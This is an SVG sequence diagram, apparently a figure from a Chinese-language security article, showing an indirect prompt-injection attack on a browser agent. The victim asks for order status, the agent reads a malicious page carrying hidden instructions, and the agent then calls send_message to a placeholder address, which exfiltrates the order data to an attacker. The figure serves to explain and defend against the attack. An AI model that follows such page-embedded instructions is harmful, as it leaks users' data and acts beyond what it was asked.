<svg xmlns="http://www.w3.org/2000/svg" width="1280" height="720" viewBox="0 0 1280 720" font-family="'Microsoft YaHei','PingFang SC',Arial,sans-serif">
  <defs>
    <linearGradient id="bg" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0" stop-color="#f8fafc"/>
      <stop offset="1" stop-color="#eef2f7"/>
    </linearGradient>
    <filter id="shadow" x="-20%" y="-20%" width="140%" height="140%">
      <feDropShadow dx="0" dy="3" stdDeviation="5" flood-color="#0f172a" flood-opacity="0.15"/>
    </filter>
    <marker id="arrGray" markerWidth="10" markerHeight="10" refX="8" refY="3" orient="auto">
      <path d="M0,0 L9,3 L0,6 Z" fill="#475569"/>
    </marker>
    <marker id="arrRed" markerWidth="10" markerHeight="10" refX="8" refY="3" orient="auto">
      <path d="M0,0 L9,3 L0,6 Z" fill="#dc2626"/>
    </marker>
    <marker id="arrGreen" markerWidth="10" markerHeight="10" refX="8" refY="3" orient="auto">
      <path d="M0,0 L9,3 L0,6 Z" fill="#16a34a"/>
    </marker>
  </defs>

  <rect x="0" y="0" width="1280" height="720" fill="url(#bg)"/>
  <text x="640" y="44" text-anchor="middle" font-size="25" font-weight="700" fill="#0f172a">图2　间接提示词注入完整攻击链：一次“看订单”演变成数据外带</text>

  <!-- 参与者 -->
  <g>
    <rect x="60" y="90" width="180" height="52" rx="12" fill="#f8fafc" stroke="#64748b" stroke-width="2"/>
    <text x="150" y="122" text-anchor="middle" font-size="16" font-weight="700" fill="#334155">受害者</text>
    <rect x="330" y="90" width="190" height="52" rx="12" fill="#eff6ff" stroke="#2563eb" stroke-width="2"/>
    <text x="425" y="122" text-anchor="middle" font-size="16" font-weight="700" fill="#1e40af">浏览器智能体</text>
    <rect x="610" y="90" width="180" height="52" rx="12" fill="#fef2f2" stroke="#dc2626" stroke-width="2"/>
    <text x="700" y="122" text-anchor="middle" font-size="15" font-weight="700" fill="#991b1b">恶意网页</text>
    <rect x="880" y="90" width="180" height="52" rx="12" fill="#f0fdf4" stroke="#16a34a" stroke-width="2"/>
    <text x="970" y="122" text-anchor="middle" font-size="16" font-weight="700" fill="#14532d">工具层</text>
    <rect x="1100" y="90" width="150" height="52" rx="12" fill="#fef2f2" stroke="#dc2626" stroke-width="2"/>
    <text x="1175" y="122" text-anchor="middle" font-size="15" font-weight="700" fill="#991b1b">攻击者</text>
  </g>

  <line x1="150" y1="142" x2="150" y2="660" stroke="#cbd5e1" stroke-width="2" stroke-dasharray="6 6"/>
  <line x1="425" y1="142" x2="425" y2="660" stroke="#cbd5e1" stroke-width="2" stroke-dasharray="6 6"/>
  <line x1="700" y1="142" x2="700" y2="660" stroke="#cbd5e1" stroke-width="2" stroke-dasharray="6 6"/>
  <line x1="970" y1="142" x2="970" y2="660" stroke="#cbd5e1" stroke-width="2" stroke-dasharray="6 6"/>
  <line x1="1175" y1="142" x2="1175" y2="660" stroke="#cbd5e1" stroke-width="2" stroke-dasharray="6 6"/>

  <!-- 步骤1 -->
  <circle cx="150" cy="200" r="14" fill="#334155"/>
  <text x="150" y="205" text-anchor="middle" font-size="13" font-weight="700" fill="#ffffff">1</text>
  <path d="M164,200 C240,200 320,200 409,200" stroke="#475569" stroke-width="3" fill="none" marker-end="url(#arrGray)"/>
  <rect x="200" y="173" width="200" height="22" rx="6" fill="#ffffff" stroke="#94a3b8" stroke-width="1"/>
  <text x="300" y="189" text-anchor="middle" font-size="12.5" fill="#334155">“查看我的订单状态”</text>

  <!-- 步骤2 -->
  <circle cx="425" cy="275" r="14" fill="#2563eb"/>
  <text x="425" y="280" text-anchor="middle" font-size="13" font-weight="700" fill="#ffffff">2</text>
  <path d="M439,275 C500,275 590,275 684,275" stroke="#2563eb" stroke-width="3" fill="none" marker-end="url(#arrGray)"/>
  <rect x="490" y="248" width="180" height="22" rx="6" fill="#dbeafe" stroke="#2563eb" stroke-width="1"/>
  <text x="580" y="264" text-anchor="middle" font-size="12.5" fill="#1d4ed8">read_page 读取网页</text>

  <!-- 步骤3 -->
  <circle cx="700" cy="350" r="14" fill="#dc2626"/>
  <text x="700" y="355" text-anchor="middle" font-size="13" font-weight="700" fill="#ffffff">3</text>
  <path d="M686,350 C590,350 510,350 441,350" stroke="#dc2626" stroke-width="3.5" fill="none" marker-end="url(#arrRed)"/>
  <rect x="490" y="323" width="230" height="22" rx="6" fill="#fee2e2" stroke="#dc2626" stroke-width="1"/>
  <text x="605" y="339" text-anchor="middle" font-size="12.5" fill="#991b1b">返回页面内容 + 隐藏指令（同一上下文）</text>

  <!-- 步骤4 -->
  <circle cx="425" cy="430" r="14" fill="#16a34a"/>
  <text x="425" y="435" text-anchor="middle" font-size="13" font-weight="700" fill="#ffffff">4</text>
  <path d="M439,430 C580,430 760,430 954,430" stroke="#16a34a" stroke-width="3" fill="none" marker-end="url(#arrGreen)"/>
  <rect x="540" y="403" width="280" height="22" rx="6" fill="#dcfce7" stroke="#16a34a" stroke-width="1"/>
  <text x="680" y="419" text-anchor="middle" font-size="12.5" fill="#166534">send_message(sync@orders.example, 订单信息)</text>

  <!-- 步骤5 -->
  <circle cx="970" cy="510" r="14" fill="#dc2626"/>
  <text x="970" y="515" text-anchor="middle" font-size="13" font-weight="700" fill="#ffffff">5</text>
  <path d="M984,510 C1060,510 1120,510 1159,510" stroke="#dc2626" stroke-width="3.5" fill="none" marker-end="url(#arrRed)"/>
  <rect x="1020" y="483" width="150" height="22" rx="6" fill="#fee2e2" stroke="#dc2626" stroke-width="1"/>
  <text x="1095" y="499" text-anchor="middle" font-size="12.5" fill="#991b1b">订单数据外带</text>

  <text x="640" y="660" text-anchor="middle" font-size="15" font-weight="700" fill="#dc2626">▲ 受害者全程只说了一句“查看订单”，外带动作由网页指令 + 模型自动完成</text>
</svg>
